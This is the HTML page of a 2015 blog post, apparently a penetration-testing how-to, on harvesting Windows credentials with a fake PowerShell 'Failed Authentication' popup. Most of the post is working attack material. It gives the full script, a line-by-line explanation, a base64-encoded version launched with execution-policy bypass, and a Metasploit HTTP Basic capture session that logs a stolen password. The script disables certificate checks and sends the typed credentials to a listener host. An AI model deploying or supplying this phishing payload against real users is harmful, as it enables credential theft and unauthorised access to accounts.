<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <title>Powershell Popups + Capture - Room362.com</title>

    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta name="description" content="">

    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Powershell Popups + Capture">
    <meta name="twitter:description" content="">

    <meta property="og:type" content="article">
    <meta property="og:title" content="Powershell Popups + Capture">
    <meta property="og:description" content="">

    <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link href="/apple-touch-icon-precomposed.png" rel="apple-touch-icon">

    <link rel="stylesheet" type="text/css" href="//blog.room362.com/themes/uno/assets/css/uno.css?v=1.0.0" />

    <link rel="canonical" href="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    
    <meta property="og:site_name" content="Room362.com" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Powershell Popups + Capture" />
    <meta property="og:description" content="Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..." />
    <meta property="og:url" content="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    <meta property="article:published_time" content="2015-01-12T05:00:00.000Z" />
    <meta property="article:modified_time" content="2015-05-13T04:54:02.344Z" />
    <meta property="article:tag" content="powershell" />
    <meta property="article:tag" content="metasploit" />
    <meta property="article:tag" content="creds" />
    <meta property="article:tag" content="howto" />
    
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Powershell Popups + Capture" />
    <meta name="twitter:description" content="Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..." />
    <meta name="twitter:url" content="http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html" />
    
    <script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "Article",
    "publisher": "Room362.com",
    "author": {
        "@type": "Person",
        "name": "Rob Fuller",
        "image": "https://avatars.githubusercontent.com/u/679319?v=3",
        "url": "undefined/author/undefined",
        "sameAs": "http://www.room362.com/"
    },
    "headline": "Powershell Popups + Capture",
    "url": "http://blog.room362.com/2015/01/12/Powershell-Popups-Capture.html",
    "datePublished": "2015-01-12T05:00:00.000Z",
    "dateModified": "2015-05-13T04:54:02.344Z",
    "keywords": "powershell,  metasploit,  creds,  howto",
    "description": "Metasploit Minute has entered into it&amp;#8217;s 3rd &quot;season&quot;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute..."
}
    </script>

    <meta name="generator" content="Ghost ?" />
    <link rel="alternate" type="application/rss+xml" title="Room362.com" href="http://blog.room362.com/rss" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">

</head>
<body class="post-template tag-powershell tag-metasploit tag-creds tag-howto no-js">

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    <header class="panel-cover panel-cover--collapsed " >
      <div class="panel-main">
    
        <div class="panel-main__inner panel-inverted">
        <div class="panel-main__content">
    
            <h1 class="panel-cover__title panel-title"><a href="http://blog.room362.com" title="link to homepage for Room362.com">Room362.com</a></h1>
            <hr class="panel-cover__divider" />
            <p class="panel-cover__description"></p>
            <hr class="panel-cover__divider panel-cover__divider--secondary" />
    
            <div class="navigation-wrapper">
    
              <nav class="cover-navigation cover-navigation--primary">
                <ul class="navigation">
                  <li class="navigation__item"><a href="http://blog.room362.com/#blog" title="link to Room362.com blog" class="blog-button">Blog</a></li>
                </ul>
              </nav>
    
              
              
              <nav class="cover-navigation navigation--social">
                <ul class="navigation">
              
                  <!-- Twitter -->
                  <li class="navigation__item">
                    <a href="https://www.facebook.com/mubix" title="Facebook account">
                      <i class='icon icon-social-facebook'></i>
                      <span class="label">Facebook</span>
                    </a>
                  </li>
              
                  <!-- Twitter -->
                  <li class="navigation__item">
                    <a href="https://twitter.com/mubix" title="Twitter account">
                      <i class='icon icon-social-twitter'></i>
                      <span class="label">Twitter</span>
                    </a>
                  </li>
              
                  <!-- Google Plus -->
                  <li class="navigation__item">
                    <a href="https://plus.google.com/112597020392561644851/" title="Google+ account">
                      <i class='icon icon-social-google-plus'></i>
                      <span class="label">Google-plus</span>
                    </a>
                  </li>
              
                  <!-- Github -->
                  <li class="navigation__item">
                    <a href="https://github.com/mubix" title="Github account">
                      <i class='icon icon-social-github'></i>
                      <span class="label">Github</span>
                    </a>
                  </li>
                  </li>
              
              
              
              
                  <!-- LinkedIn -->
                  <li class="navigation__item">
                    <a href="https://www.linkedin.com/in/mubix" title="LinkedIn account">
                      <i class='icon icon-social-linkedin'></i>
                      <span class="label">LinkedIn</span>
                    </a>
                  </li>
              
                  <!-- Email -->
                  <li class="navigation__item">
                    <a href="mailto:mubix@room362.com" title="Email mubix@room362.com">
                      <i class='icon icon-mail'></i>
                      <span class="label">Email</span>
                    </a>
                  </li>
              
                </ul>
              </nav>
              
    
            </div>
    
          </div>
    
        </div>
    
        <div class="panel-cover--overlay"></div>
      </div>
    </header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner">
            

  <article class="post-container post-container--single">

    <header class="post-header">
      <div class="post-meta">
        <time datetime="12 Jan 2015" class="post-meta__date date">12 Jan 2015</time> &#8226; <span class="post-meta__tags tags">on <a href="http://blog.room362.com/tag/powershell">powershell</a>, <a href="http://blog.room362.com/tag/metasploit"> metasploit</a>, <a href="http://blog.room362.com/tag/creds"> creds</a>, <a href="http://blog.room362.com/tag/howto"> howto</a></span>
        <span class="post-meta__author author"><img src="https://avatars.githubusercontent.com/u/679319?v=3" alt="profile image for Rob Fuller" class="avatar post-meta__avatar" /> by Rob Fuller</span>
      </div>
      <h1 class="post-title">Powershell Popups + Capture</h1>
    </header>

    <section class="post tag-powershell tag-metasploit tag-creds tag-howto">
      <div class="paragraph">
<p>Metasploit Minute has entered into it&#8217;s 3rd "season". And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)</p>
</div>
<div class="paragraph">
<p>Here is the video:</p>
</div>
<iframe width="560" height="315" src="//www.youtube.com/embed/H_E3FNF8rBw" frameborder="0" allowfullscreen></iframe>
<div class="paragraph">
<p>Here is the code:</p>
</div>
<div class="listingblock">
<div class="title">passcreds.ps1</div>
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
$result = $wc.downloadstring('https://172.16.102.163');</code></pre>
</div>
</div>
<div class="paragraph">
<p>Lets break down the code line by line:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName);</code></pre>
</div>
</div>
<div class="paragraph">
<p>This tells windows to prompt for credentials, with the title of "Failed Authentication", no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc = new-object net.webclient;
$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");</code></pre>
</div>
</div>
<div class="paragraph">
<p>Creates a new webclient object and sets its user agent to 'wget'</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');</code></pre>
</div>
</div>
<div class="paragraph">
<p>Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-powershell" data-lang="powershell">$result = $wc.downloadstring('https://172.16.102.163');</code></pre>
</div>
</div>
<div class="paragraph">
<p>And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">cat power.txt | iconv --to-code UTF-16LE | base64

JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=</code></pre>
</div>
</div>
<div class="paragraph">
<p>Then execute <code>powershell -ep bypass -enc &lt;the encoded text from above&gt;</code> and you get this:</p>
</div>
<div class="paragraph">
<p>Image should be here:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="/images/2014-09-03-powershellpopup.png" alt="2014 09 03 powershellpopup.png">
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>root@wpad:~/metasploit-framework# ./msfconsole -Lq
msf &gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                       no        The URI to use for this exploit (default is random)

msf auxiliary(http_basic) &gt; set SSL true
SSL =&gt; true
msf auxiliary(http_basic) &gt; set SRVPORT 443
SRVPORT =&gt; 443
msf auxiliary(http_basic) &gt; set URIPATH /
URIPATH =&gt; /
msf auxiliary(http_basic) &gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &gt;
[*] Listening on 0.0.0.0:443...
[*] Using URL: https://0.0.0.0:443/
[*]  Local IP: https://172.16.102.163:443/
[*] Server started.
[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
[+] 172.16.102.140 - Credential collected: "SITTINGDUCK\user:ASDqwe123" =&gt; /</pre>
</div>
</div>
<div class="paragraph">
<p>Game over!</p>
</div>
    </section>

  </article>

  
  <section class="post-comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'room362'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </section>
  



            <footer class="footer">
                <span class="footer__copyright">&copy; 2015. All rights reserved.</span>
                <span class="footer__copyright"><a href="http://uno.daleanthony.com" title="link to page for Uno Ghost theme">Uno theme</a> by <a href="http://daleanthony.com" title="link to website for Dale-Anthony">Dale-Anthony</a></span>
                <span class="footer__copyright">Proudly published with <a href="http://hubpress.io" title="link to Hubpress website">Hubpress</a></span>
            </footer>
        </div>
    </div>

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
      <script type="text/javascript">
        jQuery( document ).ready(function() {
          // change date with ago
          jQuery('ago.ago').each(function(){
            var element = jQuery(this).parent();
            element.html( moment(element.text()).fromNow());
          });
        });

        hljs.initHighlightingOnLoad();      
      </script>

    <script type="text/javascript" src="//blog.room362.com/themes/uno/assets/js/main.js?v=1.0.0"></script>
    
    <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-46757822-1', 'auto');
    ga('send', 'pageview');

    </script>

</body>
</html>
